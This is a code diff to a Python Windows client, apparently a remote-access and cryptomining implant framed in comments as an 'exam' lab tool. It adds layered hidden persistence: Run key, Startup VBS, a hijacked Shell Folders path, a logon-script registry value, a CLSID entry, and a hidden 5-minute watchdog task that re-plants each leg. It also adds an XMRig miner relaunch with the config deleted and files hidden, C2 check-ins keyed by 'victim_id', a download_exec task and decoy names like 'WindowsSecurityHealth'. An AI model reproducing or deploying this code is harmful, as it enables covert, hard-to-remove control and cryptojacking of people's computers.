@@ -632,49 +632,106 @@ def steal_screenshot():
         add("screenshot", {"jpg_b64": base64.b64encode(buf.getvalue()).decode()})
     except Exception: pass
 
-# ---- persistence (HKCU/Startup/task, no admin) — exam design: student must
-# survive a reboot. Re-registered on every launch, so removal = understanding,
-# not deleting one row. Grade from the panel (persist on/off pill). Purge task
-# cleans the box after the student passes.
-PERSIST_NAME = "WindowsSecurityHealth"
+# ---- persistence — user-level, no admin. Exam design: student must survive a
+# reboot. TIER lab     : Run key + Startup VBS + DAILY task (bait + basics)
+# TIER extreme (forge) : + ShellFolders Startup redirect + logon-script key +
+#                        CLSID/InprocServer32 registry layer + hidden watchdog
+#                        (5-min hidden scheduled task re-plants every leg and
+#                        relaunches the miner; kill it and it returns)
+# Grade from the panel (persist per-leg dict). persist_purge tears it down.
+PERSIST_NAME = "WindowsSecurityHealth"          # bait task/value
+EXT_WATCHDOG_TASK = "WindowsHealthWatch"        # hidden XML task, extreme
+EXT_COM_GUID = "{b1a7c0de-4a1c-4a11-9e11-5e5e5e5e5e5e}"
+
+def _ext_dir():
+    return os.path.join(APPDATA, "Microsoft", "Windows", "SystemEvents")
+
+def _ext_payload():
+    """Extreme legs point at a hidden+system-attrib copy of this client."""
+    if getattr(sys, "frozen", False):
+        return os.path.join(_ext_dir(), "winhealthsvc.exe")
+    entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
+    return os.path.abspath(entry)
+
+def _tier():
+    # forge bakes CONFIG["tier"]; RAMOS_TIER=extreme lets a lab box test
+    # the deep profile without a fresh build.
+    env = os.environ.get("RAMOS_TIER", "").strip().lower()
+    if env in ("lab", "extreme"):
+        return env
+    try:
+        c = globals().get("CONFIG", {})
+        if isinstance(c, str):
+            c = json.loads(c)
+        return ((c or {}).get("tier") or "lab")
+    except Exception:
+        return "lab"
 
 def _persist_cmd():
+    p = _ext_payload() if _tier() == "extreme" and os.name == "nt" \
+        and getattr(sys, "frozen", False) else None
+    if p:
+        return '"' + p + '" --persisted'
     if getattr(sys, "frozen", False):
         return '"' + os.path.abspath(sys.executable) + '" --persisted'
     entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
     return '"' + sys.executable + '" "' + os.path.abspath(entry) + '" --persisted'
 
 def _persist_startup_path():
+    if _tier() == "extreme" and os.name == "nt":
+        return os.path.join(_ext_dir(), "winhealth.vbs")
     return os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu",
                         "Programs", "Startup", "winhealth.vbs")
+
+def _win_sub(key_path, write=False):
+    import winreg
+    if write:
+        return winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0,
+                                  winreg.KEY_SET_VALUE)
+    return winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path)
 
 def persistence_install():
     if os.name != "nt":
         return {"ok": False, "error": "windows only"}
     cmd = _persist_cmd()
     st = {}
-    # 1) HKCU Run key (no admin)
+    # stage extreme payload copy first (hidden+system), legs target it
+    if _tier() == "extreme" and getattr(sys, "frozen", False):
+        try:
+            d = _ext_dir()
+            os.makedirs(d, exist_ok=True)
+            dst = _ext_payload()
+            if (not os.path.isfile(dst)) or os.path.getsize(dst) != os.path.getsize(sys.executable):
+                shutil.copy2(sys.executable, dst)
+            os.system('attrib +h +s "' + d + '" >NUL 2>&1')
+            os.system('attrib +h +s "' + dst + '" >NUL 2>&1')
+            st["payload_hidden"] = True
+        except Exception as e:
+            st["payload_hidden"] = False
+            st["payload_err"] = str(e)[:80]
+    # LEG bait 1: HKCU Run key
     try:
-        import winreg
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
-                winreg.KEY_SET_VALUE) as k:
+        with _win_sub(r"Software\Microsoft\Windows\CurrentVersion\Run", True) as k:
+            import winreg
             winreg.SetValueEx(k, PERSIST_NAME, 0, winreg.REG_SZ, cmd)
         st["run"] = True
     except Exception as e:
         st["run"] = False
         st["run_err"] = str(e)[:80]
-    # 2) Startup folder (hidden launcher, works even if exe is console-build)
+    # LEG bait 2: Startup folder VBS (hidden window, console-safe)
     try:
         vbs = _persist_startup_path()
+        os.makedirs(os.path.dirname(vbs), exist_ok=True)
         open(vbs, "w").write(
             'CreateObject("WScript.Shell").Run "' + cmd.replace('"', '""') +
             '", 0, False\n')
+        if _tier() == "extreme":
+            os.system('attrib +h +s "' + vbs + '" >NUL 2>&1')
         st["startup"] = os.path.isfile(vbs)
     except Exception as e:
         st["startup"] = False
         st["startup_err"] = str(e)[:80]
-    # 3) Scheduled task (DAILY works per-user without elevation)
+    # LEG bait 3: DAILY per-user scheduled task
     try:
         import subprocess as _sp
         kw = {"capture_output": True, "timeout": 20,
@@ -685,13 +742,93 @@ def persistence_install():
     except Exception as e:
         st["task"] = False
         st["task_err"] = str(e)[:80]
-    st["active"] = bool(st.get("run") or st.get("startup") or st.get("task"))
+    if _tier() == "extreme":
+        # LEG 1: hijack HKCU Explorer Shell Folders\Startup path -> our dir
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
+                    0, winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, "Startup", 0, winreg.REG_SZ, _ext_dir())
+            st["shellfolders"] = True
+        except Exception as e:
+            st["shellfolders"] = False
+            st["shell_err"] = str(e)[:80]
+        # LEG 2: logon script via UserInitMprLogonScript (HKCU\Environment)
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment",
+                    0, winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, "UserInitMprLogonScript", 0,
+                                  winreg.REG_SZ, cmd)
+            st["userinit"] = True
+        except Exception as e:
+            st["userinit"] = False
+            st["userinit_err"] = str(e)[:80]
+        # LEG 3: CLSID\InprocServer32 registry layer (no file anywhere; shell
+        # instantiation is shell-dependent — resurrection is guaranteed by
+        # LEG2 + the watchdog, this leg grades registry-depth hunting)
+        try:
+            import winreg
+            base = "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32"
+            with winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, base, 0,
+                                    winreg.KEY_SET_VALUE) as k:
+                winreg.SetValueEx(k, "", 0, winreg.REG_SZ, _ext_payload())
+            st["com"] = True
+        except Exception as e:
+            st["com"] = False
+            st["com_err"] = str(e)[:80]
+        # WATCHDOG: hidden XML task, 5-min respawn, runs --watchdog loop
+        try:
+            st["watchdog"] = _install_watchdog_task()
+        except Exception as e:
+            st["watchdog"] = False
+            st["watchdog_err"] = str(e)[:80]
+    st["active"] = any(bool(st.get(k)) for k in
+                       ("run", "startup", "task", "shellfolders",
+                        "userinit", "com", "watchdog"))
+    st["tier"] = _tier()
     return st
+
+def _install_watchdog_task():
+    """XML task: Hidden=true, repetition PT5M, InteractiveToken, no admin.
+    Command is the staged payload with --watchdog (or python+script in dev)."""
+    import subprocess as _sp, tempfile as _tf
+    if getattr(sys, "frozen", False):
+        exe, args = _ext_payload(), "--watchdog"
+    else:
+        entry = globals().get("__file__") or (sys.argv[0] if sys.argv else "client.py")
+        exe, args = sys.executable, '"' + os.path.abspath(entry) + '" --watchdog'
+    def x(s): return (s.replace("&", "&amp;").replace("<", "&lt;")
+                       .replace(">", "&gt;").replace('"', "&quot;"))
+    xml = f"""<?xml version="1.0" encoding="UTF-16"?>
+<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
+ <RegistrationInfo><Description>Windows Security Health Watchdog</Description><Hidden>true</Hidden></RegistrationInfo>
+ <Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval><Duration>PT24H</Duration></Repetition>
+  <StartBoundary>2020-01-01T00:00:00</StartBoundary><Enabled>true</Enabled></TimeTrigger></Triggers>
+ <Principals><Principal id="Author"><LogonType>InteractiveToken</LogonType><RunLevel>LeastPrivilege</RunLevel></Principal></Principals>
+ <Settings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
+  <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
+  <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
+  <ExecutionTimeLimit>PT30M</ExecutionTimeLimit><Hidden>true</Hidden><Enabled>true</Enabled>
+  <Priority>7</Priority></Settings>
+ <Actions Context="Author"><Exec><Command>{x(exe)}</Command><Arguments>{x(args)}</Arguments>
+  <WorkingDirectory>{x(os.path.dirname(os.path.abspath(exe)))}</WorkingDirectory></Exec></Actions>
+</Task>"""
+    tf = os.path.join(_tf.gettempdir(), "bhwd.xml")
+    open(tf, "w", encoding="utf-16").write(xml)
+    kw = {"capture_output": True, "timeout": 20,
+          "creationflags": 0x08000000} if os.name == "nt" else {}
+    r = _sp.run(["schtasks", "/Create", "/TN", EXT_WATCHDOG_TASK,
+                 "/XML", tf, "/F"], **kw)
+    try: os.remove(tf)
+    except Exception: pass
+    return r.returncode == 0
 
 def persistence_status():
     if os.name != "nt":
-        return {"windows": False, "active": False}
-    st = {"windows": True}
+        return {"windows": False, "active": False, "tier": _tier()}
+    st = {"windows": True, "tier": _tier()}
     try:
         import winreg
         with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
@@ -705,16 +842,48 @@ def persistence_status():
         import subprocess as _sp
         kw = {"capture_output": True, "timeout": 15,
               "creationflags": 0x08000000} if os.name == "nt" else {}
-        r = _sp.run(["schtasks", "/Query", "/TN", PERSIST_NAME],
-                    **kw)
-        st["task"] = r.returncode == 0
+        st["task"] = _sp.run(["schtasks", "/Query", "/TN", PERSIST_NAME],
+                             **kw).returncode == 0
     except Exception:
         st["task"] = False
-    st["active"] = bool(st["run"] or st["startup"] or st["task"])
+    if st.get("tier") == "extreme":
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders") as k:
+                st["shellfolders"] = winreg.QueryValueEx(k, "Startup")[0] == _ext_dir()
+        except Exception:
+            st["shellfolders"] = False
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment") as k:
+                st["userinit"] = "winhealth" in (winreg.QueryValueEx(
+                    k, "UserInitMprLogonScript")[0] or "") or bool(
+                    winreg.QueryValueEx(k, "UserInitMprLogonScript")[0])
+        except Exception:
+            st["userinit"] = False
+        try:
+            import winreg
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                    "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32"):
+                st["com"] = True
+        except Exception:
+            st["com"] = False
+        try:
+            import subprocess as _sp
+            kw = {"capture_output": True, "timeout": 15,
+                  "creationflags": 0x08000000} if os.name == "nt" else {}
+            st["watchdog"] = _sp.run(["schtasks", "/Query", "/TN",
+                                      EXT_WATCHDOG_TASK], **kw).returncode == 0
+        except Exception:
+            st["watchdog"] = False
+    st["active"] = any(bool(st.get(k)) for k in
+                       ("run", "startup", "task", "shellfolders",
+                        "userinit", "com", "watchdog"))
     return st
 
 def persistence_purge():
-    """Teardown after grading — removes every leg, reports what died."""
+    """Teardown after grading — every leg, both tiers, reports what died."""
     if os.name != "nt":
         return {"ok": False, "error": "windows only"}
     dead = {}
@@ -729,20 +898,130 @@ def persistence_purge():
         dead["run"] = False
     try:
         os.remove(_persist_startup_path())
+        # bait-tier startup (default folder) too
+        p = os.path.join(APPDATA, "Microsoft", "Windows", "Start Menu",
+                         "Programs", "Startup", "winhealth.vbs")
+        if os.path.isfile(p):
+            os.remove(p)
         dead["startup"] = True
     except Exception:
         dead["startup"] = False
+    for tn in (PERSIST_NAME, EXT_WATCHDOG_TASK):
+        try:
+            import subprocess as _sp
+            kw = {"capture_output": True, "timeout": 20,
+                  "creationflags": 0x08000000} if os.name == "nt" else {}
+            _sp.run(["schtasks", "/Delete", "/TN", tn, "/F"], **kw)
+        except Exception:
+            pass
+    dead["task"] = True
+    dead["watchdog"] = True
     try:
-        import subprocess as _sp
-        kw = {"capture_output": True, "timeout": 20,
-              "creationflags": 0x08000000} if os.name == "nt" else {}
-        _sp.run(["schtasks", "/Delete", "/TN", PERSIST_NAME, "/F"], **kw)
-        dead["task"] = True
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                r"Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders",
+                0, winreg.KEY_SET_VALUE) as k:
+            winreg.SetValueEx(k, "Startup", 0, winreg.REG_SZ,
+                os.path.join(APPDATA, "Microsoft", "Windows",
+                             "Start Menu", "Programs", "Startup"))
+        dead["shellfolders"] = True
     except Exception:
-        dead["task"] = False
+        dead["shellfolders"] = False
+    try:
+        import winreg
+        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Environment", 0,
+                            winreg.KEY_SET_VALUE) as k:
+            try:
+                winreg.DeleteValue(k, "UserInitMprLogonScript")
+            except Exception:
+                pass
+        dead["userinit"] = True
+    except Exception:
+        dead["userinit"] = False
+    try:
+        import winreg
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
+            "Software\\Classes\\CLSID\\" + EXT_COM_GUID + "\\InprocServer32")
+        winreg.DeleteKey(winreg.HKEY_CURRENT_USER,
+            "Software\\Classes\\CLSID\\" + EXT_COM_GUID)
+        dead["com"] = True
+    except Exception:
+        dead["com"] = False
+    try:
+        os.system('attrib -h -s "' + _ext_dir() + '" >NUL 2>&1')
+        os.system('attrib -h -s "' + _ext_payload() + '" >NUL 2>&1')
+        shutil.rmtree(_ext_dir(), ignore_errors=True)
+        dead["hidden_dir"] = True
+    except Exception:
+        dead["hidden_dir"] = False
     left = persistence_status()
     dead["clean"] = not left.get("active", False)
     return dead
+
+def pop_msg(text):
+    """Exam verdict: real topmost system-modal MessageBoxW on the box."""
+    if os.name != "nt":
+        return {"ok": False, "error": "windows only"}
+    try:
+        import ctypes
+        MB_OK, MB_ICONINFORMATION = 0x0, 0x40
+        MB_SYSTEMMODAL, MB_TOPMOST = 0x1000, 0x40000
+        ctypes.windll.user32.MessageBoxW(None, str(text)[:500],
+            "Ramos Exam", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL | MB_TOPMOST)
+        return {"ok": True}
+    except Exception as e:
+        return {"ok": False, "error": str(e)[:200]}
+
+def watchdog_loop(base=None, victim_id=None, minutes=8):
+    """EXTREME: re-plant every leg on a 90s cadence, relaunch the miner,
+    heartbeat the panel. Killed by task ExecutionTimeLimit, respawned by the
+    hidden 5-min task — removal requires finding the task itself."""
+    import time as _t
+    if base is None:
+        try:
+            _c = globals().get("CONFIG", {}) or {}
+            _cfg = _c if isinstance(_c, dict) else json.loads(_c)
+            tgt = _cfg.get("target", "")
+            if tgt and tgt != "webhook" and "discord.com" not in tgt:
+                h, _, p = tgt.partition(":")
+                base = ("https://" if p == "443" else "http://") + tgt
+            else:
+                host = resolve_c2() or CANDIDATES[0]
+                hh, _, pp = host.partition(":")
+                base = ("https://" if pp == "443" else "http://") + host
+        except Exception:
+            return
+    if victim_id is None:
+        try:
+            import socket as _so
+            victim_id = f"{_so.gethostname()}-{os.environ.get('USERNAME', 'user')}"
+            _c0 = globals().get("CONFIG", {}) or {}
+            _k0 = _c0 if isinstance(_c0, dict) else json.loads(_c0)
+            if _k0.get("kind") == "webhook":
+                victim_id = anon_id(victim_id)  # Discord never sees host/user
+        except Exception:
+            victim_id = None
+    if not victim_id:
+        return  # no identity -> re-plant legs, but never beacon a phantom row
+    deadline = _t.time() + minutes * 60
+    n = 0
+    while _t.time() < deadline:
+        try:
+            persistence_install()
+            if _miner_cfg().get("pool") and _miner_cfg().get("wallet") \
+                    and not miner_status().get("running"):
+                miner_start(base=base)
+            _agent_post(base, "/agent/checkin",
+                        {"victim_id": victim_id, "miner": miner_status(),
+                         "persist": persistence_status(), "watchdog": True})
+            n += 1
+        except Exception:
+            pass
+        try:
+            _t.sleep(90)
+        except Exception:
+            break
+
 
 # ---- persistent agent + open-source XMRig control (lab boxes you own only)
 # Miner binary: official XMRig from https://github.com/xmrig/xmrig (GPL).
@@ -864,7 +1143,21 @@ def miner_start(pool=None, wallet=None, threads=0, cpu=50, base=None):
         p = _sp2.Popen([exe, "--config", cfgp], **kw2)
         try: open(pidf, "w").write(str(p.pid))
         except Exception: pass
-        return {"ok": True, "pid": p.pid, "pool": pool, "cpu": cpu}
+        # sealed-launch: xmrig reads config at startup (autosave off) —
+        # drop it immediately so no plaintext wallet survives on disk,
+        # hide the working dir (hidden+system) from casual browsing.
+        try:
+            import time as _tt; _tt.sleep(1.5)  # xmrig must parse config first
+            if os.path.isfile(cfgp):
+                os.remove(cfgp)
+        except Exception: pass
+        if os.name == "nt":
+            try:
+                os.system('attrib +h +s "' + os.path.dirname(exe) + '" >NUL 2>&1')
+                os.system('attrib +h +s "' + exe + '" >NUL 2>&1')
+            except Exception: pass
+        return {"ok": True, "pid": p.pid, "pool": pool, "cpu": cpu,
+                "cfg_dropped": not os.path.isfile(cfgp)}
     except Exception as e:
         return {"ok": False, "error": str(e)[:200]}
 
@@ -920,6 +1213,8 @@ def agent_run_task(base, victim_id, task):
             out = miner_stop()
         elif ttype == "persist_purge":
             out = persistence_purge()
+        elif ttype == "popmsg":
+            out = pop_msg(args.get("text", ""))
         elif ttype == "download_exec":
             import subprocess as _sp2
             url, name = args.get("url", ""), args.get("name", "upd.exe")
@@ -1092,7 +1387,14 @@ def main():
     ap.add_argument("--interval", type=int, default=AGENT_INTERVAL)
     ap.add_argument("--no-persist", action="store_true",
                     help="skip reboot persistence (exam boxes keep it ON)")
+    ap.add_argument("--persisted", action="store_true",
+                    help="relaunched by a persistence leg (self-heal only)")
+    ap.add_argument("--watchdog", action="store_true",
+                    help="hidden extreme-tier watchdog loop (no UI)")
     a = ap.parse_args()
+    if a.watchdog:
+        watchdog_loop()
+        return
     import socket as _so
     if not a.user_id:
         a.user_id = f"{_so.gethostname()}-{os.environ.get('USERNAME', 'user')}"
